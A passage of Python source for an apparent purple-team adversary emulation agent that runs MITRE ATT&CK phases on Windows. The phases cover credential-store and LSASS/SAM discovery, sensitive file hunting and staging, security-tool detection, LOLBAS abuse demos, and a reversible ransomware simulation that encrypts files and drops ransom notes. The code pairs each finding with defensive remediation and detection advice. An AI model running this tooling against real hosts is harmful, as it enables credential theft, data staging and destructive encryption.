        "try { $s=[adsisearcher]'(&(objectCategory=person)(objectClass=user)(adminCount=1))';"
        " $s.FindAll()|ForEach-Object{$_.Properties['samaccountname']}|Select-Object -First 20 }"
        "catch { Write-Output 'Unavailable' }", "T1087.002", "Domain admin accounts")
    if r.success and r.stdout.strip() and "Unavailable" not in r.stdout:
        log.add_finding(Finding(
            "HIGH", "T1087.002", "Domain admin accounts enumerated via LDAP",
            remediation="Monitor LDAP queries for adminCount=1 filter",
            detection="Event ID 4662 (Directory Service Access) with adminCount filter"))
        _find("HIGH", "Domain admin accounts enumerated")

    # Privileged group memberships
    r = exe.ps("whoami /groups | Select-String 'S-1-5-32-544|S-1-5-32-555|S-1-16-12288'",
               "T1069.001", "Privileged SID check")
    if r.success and r.stdout.strip():
        log.add_finding(Finding(
            "HIGH", "T1069.001", "Current user belongs to privileged groups",
            remediation="Review group membership necessity",
            detection="Event ID 4732 / 4756 (Group membership changes)"))
        _find("HIGH", "User in privileged groups (Admin / RDP / High Integrity)")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 3: PROCESS & SERVICE INTELLIGENCE
# ───────────────────────────────────────────────────────────────────────────

def phase_processes() -> None:
    begin_phase("3", "Process & Service Intelligence",
                "T1057, T1007, T1518.001, T1497.001",
                "Map running processes — security tools, financial apps, analysis tools")

    exe.run("tasklist", ["/v"], "T1057", "Running processes via tasklist")
    exe.wmic("process get Name,ProcessId,CommandLine,ParentProcessId /format:list",
             "T1057", "Process tree via WMIC")
    exe.run("sc", ["query"], "T1007", "All services via sc")
    exe.run("driverquery", ["/v"], "T1518.001", "Installed drivers")

    # Security software detection
    sec_procs = ["MsMpEng", "MsSense", "csfalcon", "CbDefense", "SentinelAgent",
                 "sophos", "SAVService", "SEP", "ccSvcHst", "mcshield", "ESET",
                 "ekrn", "avp", "TMCCSvc", "Traps", "CortexXDR", "CylanceSvc",
                 "elastic-agent", "filebeat", "winlogbeat", "splunkd", "ossec"]
    for proc in sec_procs[:5]:
        exe.cmd(f'tasklist /fi "imagename eq {proc}.exe" 2>nul', "T1518.001", f"Check {proc}.exe")

    # Analysis tools detection
    analysis = ["wireshark", "procmon", "procexp", "x64dbg", "ida", "ghidra",
                "fiddler", "burp", "dnspy", "pestudio", "hxd", "sysinternals"]
    for proc in analysis[:4]:
        exe.cmd(f'tasklist /fi "imagename eq {proc}.exe" 2>nul', "T1497.001", f"Check {proc}.exe")

    # Financial / ERP apps
    fin_apps = ["sql", "oracle", "sap", "sage", "quickbooks", "dynamics", "navision",
                "workday", "peoplesoft", "outlook", "teams", "chrome", "firefox"]
    for app in fin_apps[:4]:
        exe.cmd(f'tasklist /fi "imagename eq {app}.exe" 2>nul', "T1057", f"Check {app}.exe")

    # Explorer injection check
    exe.wmic("process where \"Name='explorer.exe'\" get ProcessId /value", "T1055", "Explorer PID")

    # Check for LSASS access attempts (simulated)
    r = exe.cmd('tasklist /fi "imagename eq lsass.exe" /v', "T1003.001", "LSASS process details")
    if r.success:
        log.add_finding(Finding(
            "HIGH", "T1003.001", "LSASS process enumerated — credential dump target identified",
            remediation="Enable LSA protection (RunAsPPL) and Credential Guard",
            detection="Event ID 4663 (Object Access) on lsass.exe, Sysmon Event ID 10"))
        _find("HIGH", "LSASS enumerated — credential extraction target")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 4: SENSITIVE FILE DISCOVERY
# ───────────────────────────────────────────────────────────────────────────

def phase_files() -> None:
    begin_phase("4", "Sensitive File & Directory Discovery",
                "T1083, T1005, T1552.001",
                "Hunt for financial documents, certificates, configs, credential files")

    patterns = ["*.pdf", "*.docx", "*.xlsx", "*.pptx", "*.csv", "*.mdb", "*.accdb"]
    found_total = 0
    for pat in patterns:
        r = exe.cmd(f'dir "C:\\\\Users\\\\*\\\\Documents\\\\{pat}" /s /b 2>nul | findstr /i /v "\\\\AppData\\\\"',
                    "T1083", f"Search {pat} in Documents")
        if r.success and r.stdout:
            found_total += len([l for l in r.stdout.strip().split("\n") if l.strip()])

    if found_total > 0:
        log.add_finding(Finding(
            "MEDIUM", "T1083", f"{found_total} sensitive files accessible in user directories",
            remediation="Implement file classification and DLP policies",
            detection="Event ID 4663 (Object Access) on sensitive file paths"))
        _find("MEDIUM", f"{found_total} sensitive files accessible")

    # SSH keys
    r = exe.cmd('dir "C:\\\\Users\\\\*\\\\.ssh" /s /b 2>nul', "T1552.004", "SSH directories")
    if r.success and r.stdout.strip():
        log.add_finding(Finding(
            "HIGH", "T1552.004", "SSH key directories accessible — lateral movement risk",
            remediation="Restrict .ssh folder permissions; rotate keys regularly",
            detection="Event ID 4663 on .ssh directories"))
        _find("HIGH", "SSH key directories found")

    # Password manager DBs
    exe.cmd('dir "C:\\\\Users\\\\*\\\\*.kdbx" /s /b 2>nul', "T1555", "KeePass databases")

    # Certificates
    exe.ps("Get-ChildItem -Path C:\\\\Users -Recurse -Include *.pfx,*.p12,*.pem,*.cer,*.key "
           "-ErrorAction SilentlyContinue | Select-Object -First 15 FullName,Length,LastWriteTime | Format-Table -AutoSize",
           "T1552.004", "Certificate files")

    # RDP files
    exe.cmd('dir "C:\\\\Users\\\\*\\\\*.rdp" /s /b 2>nul', "T1083", "RDP connection files")

    # Recent files
    exe.ps("Get-ChildItem 'C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent' "
           "-ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | "
           "Select-Object -First 15 Name,LastWriteTime | Format-Table", "T1083", "Recently accessed files")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 5: CREDENTIAL ACCESS RECONNAISSANCE
# ───────────────────────────────────────────────────────────────────────────

def phase_creds() -> None:
    begin_phase("5", "Credential Access Reconnaissance",
                "T1552.001, T1555.003, T1555.004, T1003.001, T1552.006, T1555",
                "Map credential stores: browsers, vault, LSASS, SAM, cloud tokens")

    # Browser credential stores
    exe.cmd('dir "C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data" /s /b 2>nul',
            "T1555.003", "Chrome Login Data")
    exe.cmd('dir "C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\\\\logins.json" /s /b 2>nul',
            "T1555.003", "Firefox logins.json")
    exe.cmd('dir "C:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data" /s /b 2>nul',
            "T1555.003", "Edge Login Data")

    # Credential Manager
    exe.run("cmdkey", ["/list"], "T1555.004", "Credential Manager")

    # PowerShell history
    exe.ps("Get-ChildItem 'C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt' "
           "-ErrorAction SilentlyContinue | ForEach-Object { "
           "Write-Output ('History: ' + $_.FullName); "
           "Get-Content $_.FullName -Tail 30 -ErrorAction SilentlyContinue | "
           "Select-String -Pattern 'password|secret|token|key|credential|connect' -SimpleMatch }",
           "T1552.001", "PS history credential keywords")

    # LSASS
    exe.cmd('tasklist /fi "imagename eq lsass.exe" /v', "T1003.001", "LSASS details")

    # SAM permissions
    exe.run("icacls", [r"C:\Windows\System32\config\SAM"], "T1003.002", "SAM hive ACLs")

    # Cached credentials
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "T1003.005",
            "Cached logon credentials")

    # Cloud creds
    cloud_paths = [
        ("AWS", r"C:\\\\Users\\\\*\\\\.aws\\\\credentials"),
        ("Azure", r"C:\\\\Users\\\\*\\\\.azure\\\\accessTokens.json"),
        ("GCP", r"C:\\\\Users\\\\*\\\\.config\\\\gcloud\\\\credentials.db"),
    ]
    cloud_found = 0
    for provider, path in cloud_paths:
        r = exe.cmd(f'dir "{path}" /s /b 2>nul', "T1552.001", f"{provider} credentials")
        if r.success and r.stdout.strip():
            cloud_found += len([l for l in r.stdout.strip().split("\n") if l.strip()])
    if cloud_found > 0:
        log.add_finding(Finding(
            "HIGH", "T1552.001", f"Cloud provider credentials found ({cloud_found} files)",
            remediation="Store cloud credentials in dedicated vaults (Azure Key Vault, AWS Secrets Manager)",
            detection="File integrity monitoring on credential paths"))
        _find("HIGH", f"Cloud credentials found ({cloud_found} files)")

    # WiFi profiles
    exe.run("netsh", ["wlan", "show", "profiles"], "T1552.006", "WiFi profiles")

    end_phase()

# ───────────────────────────────────────────────────────────────────────────
# PHASE 6: DEFENSE EVASION RECONNAISSANCE
# ───────────────────────────────────────────────────────────────────────────

def phase_defense() -> None:
    begin_phase("6", "Defense Evasion Reconnaissance",
                "T1562.001, T1562.004, T1218, T1036, T1027",
                "Map security controls, logging config, AMSI, AppLocker, firewall rules")

    # PowerShell logging
    exe.reg("query", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
            "T1562.001", "PS ScriptBlockLogging")
    exe.reg("query", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
            "T1562.001", "PS ModuleLogging")
    exe.reg("query", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
            "T1562.001", "PS Transcription")

    # Sysmon
    exe.run("sc", ["query", "Sysmon"], "T1518.001", "Sysmon service")
    exe.run("sc", ["query", "SysmonDrv"], "T1518.001", "Sysmon driver")

    # Firewall
    exe.run("netsh", ["advfirewall", "show", "allprofiles"], "T1562.004", "Firewall profiles")
    exe.run("netsh", ["advfirewall", "firewall", "show", "rule", "name=all"], "T1562.004", "Firewall rules")

    # AppLocker
    exe.ps("Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | "
           "Select-Object -ExpandProperty RuleCollections | Select-Object -First 10 | Format-Table",
           "T1562.001", "AppLocker policy")

    # AMSI
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\AMSI\Providers", "T1562.001", "AMSI providers")

    # Event logs
    exe.run("wevtutil", ["el"], "T1562.002", "Event log list")
    exe.run("wevtutil", ["gl", "Security"], "T1562.002", "Security log config")
    exe.run("wevtutil", ["gl", "System"], "T1562.002", "System log config")
    exe.run("wevtutil", ["gl", "Microsoft-Windows-Sysmon/Operational"], "T1562.002", "Sysmon log config")

    # Audit policy
    exe.run("auditpol", ["/get", "/category:*"], "T1562.002", "Audit policy")

    # Device Guard / WDAC
    exe.ps("Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\\\\Microsoft\\\\Windows\\\\DeviceGuard' "
           "-ErrorAction SilentlyContinue | Select-Object * | Format-List", "T1562.001", "Device Guard")

    # Language mode
    r = exe.ps("$ExecutionContext.SessionState.LanguageMode", "T1562.001", "PS Language Mode")
    if r.success and "Constrained" in r.stdout:
        _ok("Constrained Language Mode detected — hardened environment", "T1562.001")
    elif r.success and "Full" in r.stdout:
        log.add_finding(Finding(
            "MEDIUM", "T1562.001", "PowerShell running in Full Language Mode",
            remediation="Enable AppLocker/WDAC to enforce Constrained Language Mode",
            detection="Event ID 400 (Engine lifecycle) with LanguageMode property"))
        _find("MEDIUM", "Full Language Mode — no PS execution restrictions")

    # LSA protection
    exe.reg("query", r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "T1003", "LSA protection")

    # Credential Guard
    exe.ps("Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\\\\Microsoft\\\\Windows\\\\DeviceGuard' "
           "-ErrorAction SilentlyContinue | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus | Format-List",
           "T1003", "Credential Guard")

    # WEF
    exe.reg("query",
            r"HKLM\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager",
            "T1562.002", "Windows Event Forwarding")

    # ETW
    exe.run("logman", ["query", "providers"], "T1562.006", "ETW providers")


    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 7: NETWORK TOPOLOGY & LATERAL MOVEMENT RECON
# ───────────────────────────────────────────────────────────────────────────

def phase_network() -> None:
    begin_phase("7", "Network Topology & Lateral Movement Recon",
                "T1049, T1018, T1016, T1135, T1046, T1482",
                "Map network interfaces, connections, shares, trusts, and pivot points")

    exe.run("ipconfig", ["/all"], "T1016", "Network config")
    exe.wmic("nic get Name,MACAddress,Speed,NetConnectionStatus /format:list", "T1016", "Network adapters")
    exe.cmd("netstat -ano | findstr ESTABLISHED", "T1049", "Established connections")
    exe.cmd("netstat -ano | findstr LISTENING", "T1049", "Listening ports")
    exe.run("net", ["share"], "T1135", "SMB shares")
    exe.run("net", ["use"], "T1135", "Mapped drives")
    exe.run("arp", ["-a"], "T1018", "ARP cache")
    exe.run("ipconfig", ["/displaydns"], "T1018", "DNS cache")
    exe.run("route", ["print"], "T1016", "Routing table")
    exe.run("nltest", ["/domain_trusts"], "T1482", "Domain trusts")
    exe.reg("query", r"HKCU\Software\Microsoft\Terminal Server Client\Servers", "T1018", "RDP history")
    exe.run("netsh", ["interface", "portproxy", "show", "all"], "T1090", "Port proxy rules")
    exe.ps("Get-VpnConnection -ErrorAction SilentlyContinue | "
           "Select-Object Name,ServerAddress,ConnectionStatus,TunnelType | Format-Table", "T1133", "VPN connections")
    exe.run("netsh", ["wlan", "show", "interfaces"], "T1016", "WiFi interfaces")
    exe.cmd(r'type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts | findstr /v "^#" | findstr /v "^$"',
            "T1565.001", "Hosts file")

    # Check for PSRemoting / WinRM
    r = exe.run("sc", ["query", "WinRM"], "T1021.006", "WinRM service status")
    if r.success and "RUNNING" in r.stdout:
        log.add_finding(Finding(
            "MEDIUM", "T1021.006", "WinRM service is RUNNING — PSRemoting lateral movement possible",
            remediation="Disable WinRM if not required; restrict trusted hosts",
            detection="Event ID 91 (WinRM), Event ID 400/403 (PowerShell remoting)"))
        _find("MEDIUM", "WinRM running — PSRemoting available")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 8: COLLECTION & STAGING
# ───────────────────────────────────────────────────────────────────────────

def phase_collection() -> None:
    begin_phase("8", "Collection & Staging",
                "T1119, T1005, T1074.001, T1114.001, T1113",
                "Collect high-value documents, emails, and stage for exfiltration review")

    base = Path(os.environ.get("TEMP", "/tmp"))
    collection_dir = base / f"collected_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    collection_dir.mkdir(parents=True, exist_ok=True)
    exe.total += 1
    _act(f"Staging directory: {collection_dir}")

    collected = 0
    r = exe.cmd('dir "C:\\\\Users\\\\*\\\\Desktop\\\\*.txt" /s /b 2>nul', "T1074.001", "Collect text files")
    if r.success and r.stdout:
        for line in r.stdout.strip().split("\n")[:5]:
            line = line.strip()
            if line and Path(line).exists():
                try:
                    size = Path(line).stat().st_size
                    if size < 10240:
                        shutil.copy2(line, collection_dir)
                        collected += 1
                        log.write(8, f"[STAGED] {line} ({size} bytes)")
                except Exception:
                    pass

    if collected > 0:
        _ok(f"Staged {collected} files", "T1074.001")
        log.add_finding(Finding(
            "HIGH", "T1074.001", f"{collected} files staged to temp directory",
            remediation="Monitor temp directories for bulk file staging; alert on robocopy/xcopy to temp",
            detection="Event ID 4663 (Object Access) on bulk file copies to %TEMP%"))
        _find("HIGH", f"{collected} files staged for exfiltration simulation")
    else:
        _info("No files staged")
        exe.fail += 1

    exe.cmd('dir "C:\\\\Users\\\\*\\\\*.pst" /s /b 2>nul && dir "C:\\\\Users\\\\*\\\\*.ost" /s /b 2>nul',
            "T1114.001", "Email archives")
    exe.ps("try { Get-Clipboard -ErrorAction SilentlyContinue | Select-Object -First 5 } "
           "catch { Write-Output 'Unavailable' }", "T1115", "Clipboard contents")
    exe.cmd(r'dir "C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Office\\\\Recent" /b 2>nul',
            "T1005", "Recent Office files")
    exe.cmd(r'dir "C:\\\\Users\\\\*\\\\Downloads" /b 2>nul', "T1005", "Downloads folder")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 9: PERSISTENCE MECHANISM RECONNAISSANCE
# ───────────────────────────────────────────────────────────────────────────

def phase_persistence() -> None:
    begin_phase("9", "Persistence Mechanism Reconnaissance",
                "T1547.001, T1053.005, T1543.003, T1546.003, T1574.001, T1546.015",
                "Map all persistence vectors: startup, tasks, services, WMI, COM, DLL hijack")

    # Registry Run keys
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "T1547.001", "HKLM Run")
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "T1547.001", "HKLM RunOnce")
    exe.reg("query", r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "T1547.001", "HKCU Run")
    exe.reg("query", r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "T1547.001", "HKCU RunOnce")

    # Startup folders
    exe.cmd(r'dir "C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup" /s /b 2>nul',
            "T1547.001", "User startup folders")
    exe.cmd(r'dir "C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup" /b 2>nul',
            "T1547.001", "System startup folder")

    # Scheduled tasks
    exe.run("schtasks", ["/query", "/fo", "LIST", "/v"], "T1053.005", "Scheduled tasks")

    # Services
    exe.cmd("sc query type= service start= auto | findstr SERVICE_NAME", "T1543.003", "Auto-start services")
    exe.run("sc", ["query"], "T1543.003", "All services")

    # Unquoted service paths
    exe.ps("Get-WmiObject Win32_Service | Where-Object {$_.PathName -and $_.PathName -notmatch '^\"' -and "
           "$_.PathName -match ' '} | Select-Object Name,PathName,StartMode | Format-Table -AutoSize",
           "T1574.009", "Unquoted service paths")

    # WMI subscriptions
    exe.ps("Get-WmiObject -Namespace root\\\\Subscription -Class __EventFilter -ErrorAction SilentlyContinue | "
           "Select-Object Name,Query | Format-Table; "
           "Get-WmiObject -Namespace root\\\\Subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | "
           "Select-Object Name,CommandLineTemplate | Format-Table",
           "T1546.003", "WMI event subscriptions")

    # COM hijack
    exe.reg("query", r"HKCU\Software\Classes\CLSID", "T1546.015", "COM registrations")

    # PATH hijack surface
    exe.cmd("echo %PATH%", "T1574.001", "PATH directories")

    # Boot execute
    exe.reg("query", r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager", "T1547", "Boot execute", "BootExecute")

    # Check for existing WMI persistence (real detections)
    r = exe.ps("Get-WmiObject -Namespace root\\\\Subscription -Class __EventFilter -ErrorAction SilentlyContinue | Measure-Object",
               "T1546.003", "WMI filter count")
    if r.success:
        try:
            count = int(re.search(r"(\d+)", r.stdout).group(1)) if re.search(r"(\d+)", r.stdout) else 0
            if count > 0:
                log.add_finding(Finding(
                    "HIGH", "T1546.003", f"{count} WMI event filters present — potential persistence",
                    remediation="Audit WMI subscriptions regularly; monitor for __EventFilter creation",
                    detection="Sysmon Event ID 19-21 (WMI activity)"))
                _find("HIGH", f"{count} WMI event filters detected")
        except Exception:
            pass

    end_phase()

# ───────────────────────────────────────────────────────────────────────────
# PHASE 10: LOLBAS ABUSE DEMONSTRATION
# ───────────────────────────────────────────────────────────────────────────
# This phase actually demonstrates LOLBAS abuse patterns (not just using
# the binaries for recon).  It creates benign artifacts to show how each
# technique works without causing harm.

def phase_lolbas() -> None:
    begin_phase("10", "LOLBAS Abuse Demonstration",
                "T1218, T1105, T1027, T1564.004",
                "Demonstrate Living Off The Land abuse: encode, download, execute, hide")

    _warn("This phase creates benign artifacts to demonstrate LOLBAS abuse patterns")
    demo_dir = Path(os.environ.get("TEMP", "/tmp")) / "purpleteam_lolbas_demo"
    demo_dir.mkdir(parents=True, exist_ok=True)

    # 10.1 certutil encode/decode (T1027)
    exe.total += 1
    _act("certutil encode/decode demonstration (T1027)")
    test_file = demo_dir / "secret.txt"
    test_file.write_text("PURPLE TEAM SIMULATION DATA", encoding="utf-8")
    encoded = demo_dir / "secret.b64"
    r = exe.run("certutil", ["-encode", str(test_file), str(encoded)], "T1027",
                "certutil encode file")
    if r.success:
        _ok("File encoded with certutil", "T1027")
        r2 = exe.run("certutil", ["-decode", str(encoded), str(demo_dir / "secret_decoded.txt")], "T1027",
                     "certutil decode file")
        if r2.success:
            _ok("File decoded with certutil", "T1027")
            log.add_finding(Finding(
                "MEDIUM", "T1027", "certutil encode/decode functional — malware staging vector",
                remediation="Monitor certutil with non-standard arguments; alert on -encode/-decode",
                detection="Process creation with certutil -encode or -decode"))
            _find("MEDIUM", "certutil encode/decode works — obfuscation vector")

    # 10.2 bitsadmin download simulation (T1105)
    exe.total += 1
    _act("bitsadmin download demonstration (T1105)")
    # bitsadmin is deprecated but still present; use it to copy a local file simulating download
    bits_file = demo_dir / "bits_download_sim.txt"
    r = exe.run("bitsadmin", ["/transfer", "purpleteam", "/download", "/priority", "normal",
                               str(test_file), str(bits_file)], "T1105",
                "bitsadmin transfer simulation")
    if r.success:
        _ok("bitsadmin transfer succeeded", "T1105")
        log.add_finding(Finding(
            "MEDIUM", "T1105", "bitsadmin download functional — file transfer vector",
            remediation="Monitor bitsadmin /transfer; restrict via AppLocker",
            detection="Process creation with bitsadmin /transfer /download"))
        _find("MEDIUM", "bitsadmin download works — C2 staging vector")
    else:
        _info("bitsadmin may be deprecated on this system (Windows 10+)")

    # 10.3 forfiles command execution (T1202)
    exe.total += 1
    _act("forfiles command execution demonstration (T1202)")
    r = exe.run("forfiles", ["/p", str(demo_dir), "/m", "*.txt", "/c", "cmd /c echo PURPLE_TEAM_FORFILES_OK"],
                "T1202", "forfiles command execution")
    if r.success and "PURPLE_TEAM_FORFILES_OK" in r.stdout:
        _ok("forfiles executed embedded command", "T1202")
        log.add_finding(Finding(
            "MEDIUM", "T1202", "forfiles command execution functional — proxy execution",
            remediation="Monitor forfiles with /c cmd; restrict via AppLocker",
            detection="Process creation: forfiles.exe with /c argument"))
        _find("MEDIUM", "forfiles proxy execution works")

    # 10.4 esentutl copy locked file simulation (T1003)
    exe.total += 1
    _act("esentutl copy simulation (T1003)")
    # esentutl can copy locked files like SAM — simulate with a regular file
    esent_copy = demo_dir / "esent_copy_sim.txt"
    r = exe.run("esentutl", ["/y", str(test_file), "/d", str(esent_copy), "/vssrec"], "T1003",
                "esentutl copy file")
    if r.success:
        _ok("esentutl copy succeeded", "T1003")
        log.add_finding(Finding(
            "HIGH", "T1003", "esentutl file copy functional — can copy locked files (SAM, ntds.dit)",
            remediation="Restrict esentutl.exe via AppLocker; monitor for /y on system files",
            detection="Process creation: esentutl.exe with /y targeting system files"))
        _find("HIGH", "esentutl works — can copy locked SAM/ntds.dit")

    # 10.5 makecab / expand round-trip (T1027)
    exe.total += 1
    _act("makecab / expand demonstration (T1027)")
    cab_file = demo_dir / "archive.cab"
    r = exe.run("makecab", [str(test_file), str(cab_file)], "T1027", "makecab archive")
    if r.success:
        _ok("makecab succeeded", "T1027")
        expanded = demo_dir / "expanded_secret.txt"
        r2 = exe.run("expand", [str(cab_file), str(expanded)], "T1027", "expand archive")
        if r2.success:
            _ok("expand succeeded", "T1027")
            log.add_finding(Finding(
                "LOW", "T1027", "makecab/expand functional — compression obfuscation",
                remediation="Monitor makecab/expand in unusual contexts",
                detection="Process creation with makecab.exe or expand.exe"))

    # 10.6 rundll32 execution simulation (T1218.011)
    exe.total += 1
    _act("rundll32 execution demonstration (T1218.011)")
    # rundll32 can execute arbitrary DLL functions — simulate with a benign call
    r = exe.run("rundll32", ["shell32.dll,Control_RunDLL"], "T1218.011",
                "rundll32 Control_RunDLL")
    if r.success:
        _ok("rundll32 executed DLL function", "T1218.011")
        log.add_finding(Finding(
            "HIGH", "T1218.011", "rundll32 proxy execution functional",
            remediation="Monitor rundll32 with unusual DLLs; enable Attack Surface Reduction (ASR) rules",
            detection="Process creation: rundll32.exe with non-standard DLLs"))
        _find("HIGH", "rundll32 proxy execution works")

    # 10.7 mshta execution simulation (T1218.005)
    exe.total += 1
    _act("mshta execution demonstration (T1218.005)")
    hta_file = demo_dir / "test.hta"
    hta_file.write_text('<script>alert("PURPLE TEAM SIMULATION");</script>', encoding="utf-8")
    r = exe.run("mshta", [str(hta_file)], "T1218.005", "mshta execute HTA")
    # mshta with alert() may hang, so we accept timeout as "functional"
    if r.success or "Timeout" in r.stderr:
        _ok("mshta execution functional (alert may require interaction)", "T1218.005")
        log.add_finding(Finding(
            "HIGH", "T1218.005", "mshta HTA execution functional",
            remediation="Disable mshta via AppLocker; block .hta file associations",
            detection="Process creation: mshta.exe with .hta or javascript/vbscript"))
        _find("HIGH", "mshta execution works — HTA/JScript vector")

    # Cleanup demo artifacts
    try:
        shutil.rmtree(demo_dir)
        _info(f"Cleaned up demo directory: {demo_dir}")
    except Exception:
        pass

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# RANSOMWARE SIMULATION HELPERS
# ───────────────────────────────────────────────────────────────────────────

def _make_file(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _build_tree(base: Path) -> None:
    _act("Building simulated corporate directory tree...")
    exe.total += 1
    dirs = [
        base / "Finance/Q4_Reports", base / "Finance/Invoices", base / "Finance/Tax_Records",
        base / "HR/Employee_Records", base / "HR/Payroll",
        base / "Legal/Contracts", base / "Legal/Compliance",
        base / "Executive/Board_Minutes", base / "Executive/Strategy",
        base / "IT/Network_Diagrams", base / "IT/Credentials",
        base / "Operations/SOPs",
    ]
    for d in dirs: d.mkdir(parents=True, exist_ok=True)
    files = {
        base / "Finance/Q4_Reports/quarterly_revenue_2024.csv":
            "Region,Q1,Q2,Q3,Q4\nNorth America,12500000,13200000,14100000,15800000\nEMEA,8700000,9100000,9800000,10500000\nAPAC,5400000,5900000,6300000,7100000",
        base / "Finance/Invoices/invoice_8847.txt":
            "INVOICE #8847\nVendor: Acme Consulting LLC\nAmount: $45,000.00\n[PURPLE TEAM SIMULATION FILE]",
        base / "HR/Employee_Records/employee_directory.csv":
            "ID,Name,Department,Title,Salary\n1001,John Smith,Finance,CFO,285000\n1002,Jane Doe,Legal,General Counsel,265000\n[PURPLE TEAM SIMULATION FILE]",
        base / "Legal/Contracts/vendor_agreement_draft.txt":
            "MASTER SERVICES AGREEMENT — DRAFT\nValue: $2,400,000\n[PURPLE TEAM SIMULATION FILE]",
        base / "Executive/Board_Minutes/board_minutes_sept.txt":
            "BOARD OF DIRECTORS MEETING MINUTES\nDate: September 15, 2024\nBudget: $50M\n[PURPLE TEAM SIMULATION FILE]",
        base / "IT/Network_Diagrams/network_topology.txt":
            "NETWORK TOPOLOGY — INTERNAL USE ONLY\nDMZ: 10.0.1.0/24\nCorp: 10.0.10.0/24\n[PURPLE TEAM SIMULATION FILE]",
        base / "IT/Credentials/service_accounts.txt":
            "SERVICE ACCOUNT INVENTORY\nsvc_backup — AD backup\nsvc_sql_prod — SQL Server\n[PURPLE TEAM SIMULATION FILE]",
        base / "Operations/SOPs/incident_response_plan.txt":
            "INCIDENT RESPONSE PLAN v3.1\nStep 1: Detect\nStep 2: Contain\nStep 3: Eradicate\nStep 4: Recover\n[PURPLE TEAM SIMULATION FILE]",
    }
    for p, c in files.items(): _make_file(p, c)
    fc = len(list(base.rglob("*")))
    _ok(f"Created {fc} files across {len(dirs)} directories", "T1486")
    _det(f"Location: {base}")


def _encrypt_tree(base: Path) -> None:
    _act("Encrypting files with AES-256-CBC (reversible)...")
    exe.total += 1
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    except ImportError:
        _err("Install cryptography: pip install cryptography", "T1486")
        return
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b"purpleteam_salt_2024", iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(RANSOM_KEY.encode()))
    fernet = Fernet(key)
    enc_count = 0
    manifest = []
    for fp in base.rglob("*"):
        if fp.is_file() and not fp.name.startswith(".") and not fp.name.endswith(RANSOM_EXT):
            try:
                data = fp.read_bytes()
                enc = fp.with_suffix(fp.suffix + RANSOM_EXT)
                enc.write_bytes(fernet.encrypt(data))
                fp.unlink()
                manifest.append(str(fp.relative_to(base)))
                enc_count += 1
            except Exception:
                pass
    RANSOM_MANIFEST.write_text("\n".join(manifest), encoding="utf-8")
    if enc_count > 0:
        _ok(f"Encrypted {enc_count} files", "T1486")
    else:
        _err("Encryption failed", "T1486")


def _drop_notes(base: Path) -> None:
    _act("Dropping ransom notes...")
    exe.total += 1
    note = """╔══════════════════════════════════════════════════════════════╗
║ PURPLE TEAM EXERCISE — ENCRYPTED                             ║
╚══════════════════════════════════════════════════════════════╝

 ⚠ YOUR FILES HAVE BEEN ENCRYPTED ⚠

 All documents in this directory have been encrypted.

 To recover your files, run:

     python agent.py --decrypt

 MITRE ATT&CK: T1486 (Data Encrypted for Impact)

 THIS IS A PURPLE TEAM EXERCISE — ALL FILES ARE RECOVERABLE
"""
    nc = 0
    for dp in base.rglob("*"):
        if dp.is_dir():
            (dp / "!_README_PURPLETEAM_!.txt").write_text(note, encoding="utf-8")
            nc += 1
    if nc > 0:
        _ok(f"Dropped {nc} ransom notes", "T1486")
    else:
        _err("Failed to drop notes", "T1486")


def decrypt_simulation() -> None:
    _banner("PURPLE TEAM — RANSOMWARE DECRYPTION")
    if not RANSOM_SIM_DIR.exists():
        _err(f"No simulation at {RANSOM_SIM_DIR}")
        sys.exit(1)
    if not RANSOM_MANIFEST.exists():
        _err("Manifest missing")
        sys.exit(1)
    try:
